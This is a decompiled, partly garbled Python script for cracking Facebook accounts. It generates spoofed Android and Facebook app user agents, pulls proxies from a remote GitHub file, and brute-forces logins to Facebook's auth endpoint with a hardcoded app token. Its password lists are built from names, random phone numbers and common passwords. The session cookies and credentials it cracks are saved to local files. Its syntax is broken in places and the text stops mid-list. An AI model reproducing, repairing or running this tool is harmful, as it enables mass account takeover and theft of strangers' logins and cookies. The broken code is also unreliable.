
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana')
import os
import requests
import json
import time
import re
import random
import sys
import uuid
import string
import subprocess
from string import *
import bs4
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
if ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python PIK.py')
prox = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
open('proxies.txt', 'w').write(proxies)
if Exception:
    e = None
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')
    e = None
    del e
    e = None
    del e
proxies = open('proxies.txt', 'r').read().splitlines()
android_models = []
xx = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt').text.splitlines()
for line in xx:
    android_models.append(line)
    usr = []
    xd = requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
        gt = random.choice([
            'GT-1015',
            'GT-1020',
            'GT-1030',
            'GT-1035',
            'GT-1040',
            'GT-1045',
            'GT-1050',
            'GT-1240',
            'GT-1440',
            'GT-1450',
            'GT-18190',
            'GT-18262',
            'GT-19060I',
            'GT-19082',
            'GT-19083',
            'GT-19105',
            'GT-19152',
            'GT-19192',
            'GT-19300',
            'GT-19505',
            'GT-2000',
            'GT-20000',
            'GT-200s',
            'GT-3000',
            'GT-414XOP',
            'GT-6918',
            'GT-7010',
            'GT-7020',
            'GT-7030',
            'GT-7040',
            'GT-7050',
            'GT-7100',
            'GT-7105',
            'GT-7110',
            'GT-7205',
            'GT-7210',
            'GT-7240R',
            'GT-7245',
            'GT-7303',
            'GT-7310',
            'GT-7320',
            'GT-7325',
            'GT-7326',
            'GT-7340',
            'GT-7405',
            'GT-7550\t5GT-8005',
            'GT-8010',
            'GT-81',
            'GT-810',
            'GT-8105',
            'GT-8110',
            'GT-8220S',
            'GT-8410',
            'GT-9300',
            'GT-9320',
            'GT-93G',
            'GT-A7100',
            'GT-A9500',
            'GT-ANDROID',
            'GT-B2710',
            'GT-B5330',
            'GT-B5330B',
            'GT-B5330L',
            'GT-B5330ZKAINU',
            'GT-B5510',
            'GT-B5512',
            'GT-B5722',
            'GT-B7510',
            'GT-B7722',
            'GT-B7810',
            'GT-B9150',
            'GT-B9388',
            'GT-C3010',
            'GT-C3262',
            'GT-C3310R',
            'GT-C3312',
            'GT-C3312R',
            'GT-C3313T',
            'GT-C3322',
            'GT-C3322i',
            'GT-C3520',
            'GT-C3520I',
            'GT-C3592',
            'GT-C3595',
            'GT-C3782',
            'GT-C6712',
            'GT-E1282T',
            'GT-E1500',
            'GT-E2200',
            'GT-E2202',
            'GT-E2250',
            'GT-E2252',
            'GT-E2600',
            'GT-E2652W',
            'GT-E3210',
            'GT-E3309',
            'GT-E3309I',
            'GT-E3309T',
            'GT-G530H',
            'GT-g900f',
            'GT-G930F',
            'GT-H9500',
            'GT-I5508',
            'GT-I5801',
            'GT-I6410',
            'GT-I8150',
            'GT-I8160OKLTPA',
            'GT-I8160ZWLTTT',
            'GT-I8258',
            'GT-I8262D',
            'GT-I8268',
            'GT-I8505',
            'GT-I8530BAABTU',
            'GT-I8530BALCHO',
            'GT-I8530BALTTT',
            'GT-I8550E',
            'GT-i8700',
            'GT-I8750',
            'GT-I900',
            'GT-I9008L',
            'GT-i9040',
            'GT-I9080E',
            'GT-I9082C',
            'GT-I9082EWAINU',
            'GT-I9082i',
            'GT-I9100G',
            'GT-I9100LKLCHT',
            'GT-I9100M',
            'GT-I9100P',
            'GT-I9100T',
            'GT-I9105UANDBT',
            'GT-I9128E',
            'GT-I9128I',
            'GT-I9128V',
            'GT-I9158P',
            'GT-I9158V',
            'GT-I9168I',
            'GT-I9192I',
            'GT-I9195H',
            'GT-I9195L',
            'GT-I9250',
            'GT-I9303I',
            'GT-I9305N',
            'GT-I9308I',
            'GT-I9505G',
            'GT-I9505X',
            'GT-I9507V',
            'GT-I9600',
            'GT-m190',
            'GT-M5650',
            'GT-mini',
            'GT-N5000S',
            'GT-N5100',
            'GT-N5105',
            'GT-N5110',
            'GT-N5120',
            'GT-N7000B',
            'GT-N7005',
            'GT-N7100T',
            'GT-N7102',
            'GT-N7105',
            'GT-N7105T',
            'GT-N7108',
            'GT-N7108D',
            'GT-N8000',
            'GT-N8005',
            'GT-N8010',
            'GT-N8020',
            'GT-N9000',
            'GT-N9505',
            'GT-P1000CWAXSA',
            'GT-P1000M',
            'GT-P1000T',
            'GT-P1010',
            'GT-P3100B',
            'GT-P3105',
            'GT-P3108',
            'GT-P3110',
            'GT-P5100',
            'GT-P5200',
            'GT-P5210XD1',
            'GT-P5220',
            'GT-P6200',
            'GT-P6200L',
            'GT-P6201',
            'GT-P6210',
            'GT-P6211',
            'GT-P6800',
            'GT-P7100',
            'GT-P7300',
            'GT-P7300B',
            'GT-P7310',
            'GT-P7320',
            'GT-P7500D',
            'GT-P7500M',
            'GT-P7500R',
            'GT-P7500V',
            'GT-P7501',
            'GT-P7511',
            'GT-S3330',
            'GT-S3332',
            'GT-S3333',
            'GT-S3370',
            'GT-S3518',
            'GT-S3570',
            'GT-S3600i',
            'GT-S3650',
            'GT-S3653W',
            'GT-S3770K',
            'GT-S3770M',
            'GT-S3800W',
            'GT-S3802',
            'GT-S3850',
            'GT-S5220',
            'GT-S5220R',
            'GT-S5222',
            'GT-S5230',
            'GT-S5230W',
            'GT-S5233T',
            'GT-s5233w',
            'GT-S5250',
            'GT-S5253',
            'GT-s5260',
            'GT-S5280',
            'GT-S5282',
            'GT-S5283B',
            'GT-S5292',
            'GT-S5300',
            'GT-S5300L',
            'GT-S5301',
            'GT-S5301B',
            'GT-S5301L',
            'GT-S5302',
            'GT-S5302B',
            'GT-S5303',
            'GT-S5303B',
            'GT-S5310',
            'GT-S5310B',
            'GT-S5310C',
            'GT-S5310E',
            'GT-S5310G',
            'GT-S5310I',
            'GT-S5310L',
            'GT-S5310M',
            'GT-S5310N',
            'GT-S5312',
            'GT-S5312B',
            'GT-S5312C',
            'GT-S5312L',
            'GT-S5330',
            'GT-S5360',
            'GT-S5360B',
            'GT-S5360L',
            'GT-S5360T',
            'GT-S5363',
            'GT-S5367',
            'GT-S5369',
            'GT-S5380',
            'GT-S5380D',
            'GT-S5500',
            'GT-S5560',
            'GT-S5560i',
            'GT-S5570B',
            'GT-S5570I',
            'GT-S5570L',
            'GT-S5578',
            'GT-S5600',
            'GT-S5603',
            'GT-S5610',
            'GT-S5610K',
            'GT-S5611',
            'GT-S5620',
            'GT-S5670',
            'GT-S5670B',
            'GT-S5670HKBZTA',
            'GT-S5690',
            'GT-S5690R',
            'GT-S5830',
            'GT-S5830D',
            'GT-S5830G',
            'GT-S5830i',
            'GT-S5830L',
            'GT-S5830M',
            'GT-S5830T',
            'GT-S5830V',
            'GT-S5831i',
            'GT-S5838',
            'GT-S5839i',
            'GT-S6010',
            'GT-S6010BBABTU',
            'GT-S6012',
            'GT-S6012B',
            'GT-S6102',
            'GT-S6102B',
            'GT-S6293T',
            'GT-S6310B',
            'GT-S6310ZWAMID',
            'GT-S6312',
            'GT-S6313T',
            'GT-S6352',
            'GT-S6500',
            'GT-S6500D',
            'GT-S6500L',
            'GT-S6790',
            'GT-S6790L',
            'GT-S6790N',
            'GT-S6792L',
            'GT-S6800',
            'GT-S6800HKAXFA',
            'GT-S6802',
            'GT-S6810',
            'GT-S6810B',
            'GT-S6810E',
            'GT-S6810L',
            'GT-S6810M',
            'GT-S6810MBASER',
            'GT-S6810P',
            'GT-S6812',
            'GT-S6812B',
            'GT-S6812C',
            'GT-S6812i',
            'GT-S6818',
            'GT-S6818V',
            'GT-S7230E',
            'GT-S7233E',
            'GT-S7250D',
            'GT-S7262',
            'GT-S7270',
            'GT-S7270L',
            'GT-S7272',
            'GT-S7272C',
            'GT-S7273T',
            'GT-S7278',
            'GT-S7278U',
            'GT-S7390',
            'GT-S7390G',
            'GT-S7390L',
            'GT-S7392',
            'GT-S7392L',
            'GT-S7500',
            'GT-S7500ABABTU',
            'GT-S7500ABADBT',
            'GT-S7500ABTTLP',
            'GT-S7500CWADBT',
            'GT-S7500L',
            'GT-S7500T',
            'GT-S7560',
            'GT-S7560M',
            'GT-S7562',
            'GT-S7562C',
            'GT-S7562i',
            'GT-S7562L',
            'GT-S7566',
            'GT-S7568',
            'GT-S7568I',
            'GT-S7572',
            'GT-S7580E',
            'GT-S7583T',
            'GT-S758X',
            'GT-S7592',
            'GT-S7710',
            'GT-S7710L',
            'GT-S7898',
            'GT-S7898I',
            'GT-S8500',
            'GT-S8530',
            'GT-S8600',
            'GT-STB919',
            'GT-T140',
            'GT-T150',
            'GT-V8a',
            'GT-V8i',
            'GT-VC818',
            'GT-VM919S',
            'GT-W131',
            'GT-W153',
            'GT-X831',
            'GT-X853',
            'GT-X870',
            'GT-X890',
            'GT-Y8750'])
        ugen = []
        for xd in range(10000):
            aa = 'Mozilla/5.0 (Linux; U; Android'
            b = random.choice([
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12',
                '13'])
            c = f''' en-us; {str(gt)}'''
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = 'Mobile Safari/537.36'
            uaku2 = f'''{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'''
            ugen.append(uaku2)
            for agent in range(10000):
                aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
                b = random.choice([
                    '6',
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12',
                    '13'])
                c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
                d = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.randrange(1, 999)
                f = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
                h = random.randrange(73, 100)
                i = '0'
                j = random.randrange(4200, 4900)
                k = random.randrange(40, 150)
                l = 'Mobile Safari/533.1'
                fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                ugen.append(fullagnt)
                rug = []
                for nt in range(10000):
                    rr = random.randint
                    aZ = random.choice([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    rx = random.randrange(1, 999)
                    xx = f'''Mozilla/5.0 (Windows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
                    rug.append(xx)
                    ruz = []
                    for mtc in range(10000):
                        rr = random.randint
                        xd = f'''Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7, 15))} {str(rr(7, 15))}_{str(rr(1, 9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99, 199))}.0.{str(rr(3999, 4999))}.{str(rr(99, 150))} Safari/537.36 OPR/{str(rr(99, 199))}.0.{str(rr(3999, 4999))}.{str(rr(99, 150))}'''
                        ruz.append(xd)
                        ugen = []
                        for agent in range(10000):
                            aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
                            b = random.choice([
                                '6',
                                '7',
                                '8',
                                '9',
                                '10',
                                '11',
                                '12'])
                            c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
                            d = random.choice([
                                'A',
                                'B',
                                'C',
                                'D',
                                'E',
                                'F',
                                'G',
                                'H',
                                'I',
                                'J',
                                'K',
                                'L',
                                'M',
                                'N',
                                'O',
                                'P',
                                'Q',
                                'R',
                                'S',
                                'T',
                                'U',
                                'V',
                                'W',
                                'X',
                                'Y',
                                'Z'])
                            e = random.randrange(1, 999)
                            f = random.choice([
                                'A',
                                'B',
                                'C',
                                'D',
                                'E',
                                'F',
                                'G',
                                'H',
                                'I',
                                'J',
                                'K',
                                'L',
                                'M',
                                'N',
                                'O',
                                'P',
                                'Q',
                                'R',
                                'S',
                                'T',
                                'U',
                                'V',
                                'W',
                                'X',
                                'Y',
                                'Z'])
                            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
                            h = random.randrange(73, 100)
                            i = '0'
                            j = random.randrange(4200, 4900)
                            k = random.randrange(40, 150)
                            l = 'Mobile Safari/533.1'
                            fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                            ugen.append(fullagnt)
                            sim_id = ''
                            android_version = subprocess.check_output('getprop ro.build.version.release', shell = True).decode('utf-8').replace('\n', '')
                            model = subprocess.check_output('getprop ro.product.model', shell = True).decode('utf-8').replace('\n', '')
                            build = subprocess.check_output('getprop ro.build.id', shell = True).decode('utf-8').replace('\n', '')
                            fblc = 'en_GB'
                            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
                            fbcr = 'Zong'
                            fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell = True).decode('utf-8').replace('\n', '')
                            fbbd = subprocess.check_output('getprop ro.product.brand', shell = True).decode('utf-8').replace('\n', '')
                            fbdv = model
                            fbsv = android_version
                            fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell = True).decode('utf-8').replace(',', ':').replace('\n', '')
                            fbdm = '{density=2.0,height=' + subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell = True).decode('utf-8').replace('\n', '') + ',width=' + subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell = True).decode('utf-8').replace('\n', '')
                            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')
                            total = 0
                            for i in fbcr:
                                total += 1
                                select = ('1', '2')
                                if select == '1':
                                    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[0].replace('\n', '')
                                    sim_id += fbcr
if select == '2':
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell = True).decode('utf-8').split(',')[1].replace('\n', '')
    sim_id += fbcr
    if Exception:
        e = None
        fbcr = 'Zong'
        sim_id += fbcr
        e = None
        del e
        e = None
        del e
fbcr = 'Zong'
sim_id += fbcr
fbcr = 'Zong'
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm }

def PIK_UA():
    en = random.choice([
        'en_US',
        'en_GB',
        'en_PK',
        'ru_RU',
        'de_DE',
        'en_BD',
        'en_IN',
        'en_AF'])
    fbcr = "random.choice(['o2 - de', 'Verizon - us', 'Vodafone - uk','null','en_GB','en_US','en_PK','IND airtel','Nepal Telecom'])}"
    s = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randrange(9, 99)) + str(random.randint(111, 999)) + ';FBBV/' + str(random.randint(111111111, 999999999))
    e = ';[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/' + en + ';FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920S;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
    ua = s + e
    return ua

pwx = []
W = '\x1b[97;1m'
R = '\x1b[91;1m'
G = '\x1b[92;1m'
Y = '\x1b[93;1m'
B = '\x1b[94;1m'
P = '\x1b[95;1m'
S = '\x1b[96;1m'
N = '\x1b[0m'
PURPLE = '\x1b[38;5;46m'
RED = '\x1b[1;91m'
WHITE = '\x1b[1;97m'
GREEN = '\x1b[1;32m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
ORANGE = '\x1b[1;35m'
BLACK = '\x1b[1;30m'
EXTRA = '\x1b[38;5;208m'
logo = '\x1b[1;37m\n     8888888b. 8888888 888    d8P  \n     888   Y88b  888   888   d8P   \n     888    888  888   888  d8P    \n     888   d88P  888   888d88K     \n     8888888P"   888   8888888b    \n     888         888   888  Y88b   \n     888         888   888   Y88b  \n     888       8888888 888    Y88b                    \n \x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n \x1b[1;32m[\x1b[1;37m–\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mAuthor  : ACHRAF X-M \n \x1b[1;32m[\x1b[1;37m–\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mGithub  : SIMO-XD\n \x1b[1;32m[\x1b[1;37m–\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mService : Paid\n \x1b[1;32m[\x1b[1;37m–\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mVersion : \x1b[1;32m0.3\n \x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n \x1b[1;32m[\x1b[1;37m–\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mCloning ids Saved in Pik folder\n \x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'

def linex():
    print(' \x1b[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[1;37m')


def clear():
    os.system('clear')
    print(logo)

loop = 0
oks = []
cps = []
pcp = []
id = []
tokenku = []

def menu():
    clear()
    x = 'sex'
    if x == 'sex':
        print(' \x1b[1;32m[\x1b[1;37m1\x1b[1;32m] ➤\x1b[1;37mCRACK FILE ')
        print(' \x1b[1;32m[\x1b[1;37m2\x1b[1;32m] ➤\x1b[1;37mRANDOM CRACK')
        print(' \x1b[1;32m[\x1b[1;37m3\x1b[1;32m] ➤\x1b[1;37mFOLLOW FB')
        print(' \x1b[1;32m[\x1b[1;37m4\x1b[1;32m] ➤\x1b[1;31mEXIT ')
        linex()
        xd = input(' \x1b[1;32m➤\x1b[1;37mCHOOSE AN OPTION: ')
        if xd in ('1', '01'):
            clear()
            print(' \x1b[1;32m➤\x1b[1;32mPUT FILE EXAMPLE : \x1b[1;32m /sdcard/File.trt.etc..')
            linex()
            file = input(' \x1b[1;32m➤\x1b[1;37mPUT FILE PATH\x1b[1;37m: ')
            fo = open(file, 'r').read().splitlines()
            if FileNotFoundError:
                print(' \x1b[1;32m➤\x1b[1;37mFILE LOCATION NOT FOUND ')
                time.sleep(1)
                menu()
            clear()
            print(' \x1b[1;32m[\x1b[1;37m1\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mMETHOD \x1b[1;32m[MIX] ')
            print(' \x1b[1;32m[\x1b[1;37m1\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mMETHOD \x1b[1;32m[NEW] ')
            print(' \x1b[1;32m[\x1b[1;37m1\x1b[1;32m] \x1b[1;32m➤ \x1b[1;37mMETHOD \x1b[1;32m[OLD] ')
            linex()
            mthd = input(' \x1b[1;32m➤\x1b[1;37mCHOOSE : ')
            linex()
            clear()
            plist = []
            ps_limit = int(input(' \x1b[1;32m➤\x1b[1;37mHOW MANY PASSWORDS DO YOU WANT TO ADD? '))
            ps_limit = 1
            linex()
            clear()
            print(' \x1b[1;32m EXAMPLE : first last,firtslast,first123')
            linex()
            for i in range(ps_limit):
                plist.append(input(f''' \x1b[1;32m➤\x1b[1;37mPUT PASSWORD {i + 1}:\x1b[1;32m '''))
                linex()
                clear()
                print(' \x1b[1;32m➤\x1b[1;37mDO YOU WENT SHOW COOKIES :? (Y/N): ')
                linex()
                cx = input(' \x1b[1;32m➤\x1b[1;37mCHOOSE : ')
                if cx in ('y', 'Y', 'yes', 'Yes', '1'):
                    pcp.append('y')
            pcp.append('n')
            crack_submit = tred(max_workers = 60)
            clear()
            total_ids = str(len(fo))
            print(' \x1b[1;32m➤\x1b[1;37m TOTAL ACCOUNT : \x1b[1;32m' + total_ids + ' ')
            print(' \x1b[1;32m➤\x1b[1;37m CRACKING STARTED...\x1b[1;37m')
            linex()
            for user in fo:
                (ids, names) = user.split('|')
                passlist = plist
                if mthd in ('1', '01'):
                    crack_submit.submit(ffb, ids, names, passlist)
                if mthd in ('2', '02'):
                    crack_submit.submit(api, ids, names, passlist)
                if mthd in ('3', '03'):
                    crack_submit.submit(api1, ids, names, passlist)
                None(None, None)
                if not None:
                    pass
            print('\x1b[1;37m')
            linex()
            print(' THE PROCESS HAS COMPLETED')
            print(' Total OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
            linex()
            input(' PRESS ENTER TO BACK ')
            os.system('python PIK.py')
            return None
        if xd in ('2', '02'):
            pak()
            return None
        if None in ('3', '03'):
            exit()
            return None
        return None
        return None
        if requests.exceptions.ConnectionError:
            print('\n NO INTERNET CONNECTION ...')
            exit()
            return None


def pak():
    user = []
    clear()
    print('\x1b[1;31m CODE EXAMPLE : 0306,0315,0335,0345')
    code = input('\x1b[1;37m PUT CODE: ')
    limit = int(input('\x1b[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\x1b[1;37m PUT LIMIT : '))
    if ValueError:
        limit = 5000
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        TRT = tred(max_workers = 30)
        clear()
        tl = str(len(user))
        print('[+] Total accounts: \x1b[1;97m' + tl)
        print('[+] Select code: \x1b[1;97m ' + code)
        print('[+] Process has been started \x1b[1;97m')
        linex()
        for psx in user:
            ids = code + psx
            passlist = [
                psx,
                ids,
                'khankhan',
                'malik123',
                'kingkhan',
                'baloch123',
                'pak123',
                'khan123']
            TRT.submit(rndm, ids, passlist)
            None(None, None)
            if not ''.join:
                pass
    print('\x1b[1;37m')
    linex()
    print(' THE PROCESS HAS COMPLETED')
    print(' TOTAL OK/CP: ' + str(len(oks)) + '/' + str(len(cps)))
    linex()
    input(' PRESS ENTER TO BACK ')
    os.system('python PIK.py')


def ffb(ids, names, passlist):
    global loop
    sys.stdout.write(f'''\r\r\x1b[1;37m [PIK] {loop!s}|\x1b[1;37mOK:\x1b[1;32m-{len(oks)!s} \x1b[1;37m''')
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        fbav = f'''{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'''
        fbbv = str(random.randint(111111111, 999999999))
        android_version = device['android_version']
        model = device['model']
        build = device['build']
        fblc = device['fblc']
        fbcr = sim_id
        fbmf = device['fbmf']
        fbbd = device['fbbd']
        fbdv = device['fbdv']
        fbsv = device['fbsv']
        fbca = device['fbca']
        fbdm = device['fbdm']
        fbfw = '1'
        fbrv = '0'
        fban = 'FB4A'
        fbpn = 'com.facebook.katana'
        en = random.choice([
            'en_US',
            'en_GB'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = random.choice([
            '[FBAN/Orca-Android;FBAV/378.0.0.25.106;FBPN/com.facebook.orca;FBLC/es_US;FBBV/397777638;FBCR/TELCEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/220333QAG;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1505};FB_FW/1;]',
            '[FBAN/MessengerLite;FBAV/312.0.0.8.106;FBPN/com.facebook.mlite;FBLC/in_ID;FBBV/431836095;FBCR/AXIS;FBMF/vivo;FBBD/vivo;FBDV/vivo 1935;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.29375,width=1080,height=2145};]',
            '[FBAN/FB4A;FBAV/396.1.0.28.104;FBPN/com.facebook.katana;FBLC/tr_TR;FBBV/319214973;FBCR/Vodafone;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]'])
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'client_country_code': 'GB',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d' }
        headers = {
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'Content-Length': '706' }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print('\r\r\x1b[1;32m [PIK-OK] ' + ids + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            open('/sdcard/PIK-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + coki + '\n')
            open('/sdcard/PIK-OK.txt', 'a').write(ids + '|' + pas + '\n')
            oks.append(ids)
            ';'.join
        if twf in str(po):
            if 'y' in pcp:
                print('\r\r \x1b[1;34m[PIK-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                'True'
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print('\r\r\x1b[1;31m [PIK-CP] ' + ids + ' | ' + pas + '\x1b[1;97m')
                open('/sdcard/PIK-CP.txt', 'a').write(ids + '|' + pas + '\n')
                'X-FB-Server-Cluster'
            open('/sdcard/PIK-CP.txt', 'a').write(ids + '|' + pas + '\n')
            'True'
        loop += 1
        return None
        if Exception:
            e = 'X-FB-Client-IP'
            e = None
            del e
            return None
        e = 'X-FB-Client-IP'
        del e

xxxxx = ('GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300', 'GT-19505', 'GT-2000', 'GT-20000', 'GT-200s', 'GT-3000', 'GT-414XOP', 'GT-6918', 'GT-7010', 'GT-7020', 'GT-7030', 'GT-7040', 'GT-7050', 'GT-7100', 'GT-7105', 'GT-7110', 'GT-7205', 'GT-7210', 'GT-7240R', 'GT-7245', 'GT-7303', 'GT-7310', 'GT-7320', 'GT-7325', 'GT-7326', 'GT-7340', 'GT-7405', 'GT-7550 5GT-8005', 'GT-8010', 'GT-81', 'GT-810', 'GT-8105', 'GT-8110', 'GT-8220S', 'GT-8410', 'GT-9300', 'GT-9320', 'GT-93G', 'GT-A7100', 'GT-A9500', 'GT-ANDROID', 'GT-B2710', 'GT-B5330', 'GT-B5330B', 'GT-B5330L', 'GT-B5330ZKAINU', 'GT-B5510', 'GT-B5512', 'GT-B5722', 'GT-B7510', 'GT-B7722', 'GT-B7810', 'GT-B9150', 'GT-B9388', 'GT-C3010', 'GT-C3262', 'GT-C3310R', 'GT-C3312', 'GT-C3312R', 'GT-C3313T', 'GT-C3322', 'GT-C3322i', 'GT-C3520', 'GT-C3520I', 'GT-C3592', 'GT-C3595', 'GT-C3782', 'GT-C6712', 'GT-E1282T', 'GT-E1500', 'GT-E2200', 'GT-E2202', 'GT-E2250', 'GT-E2252', 'GT-E2600', 'GT-E2652W', 'GT-E3210', 'GT-E3309', 'GT-E3309I', 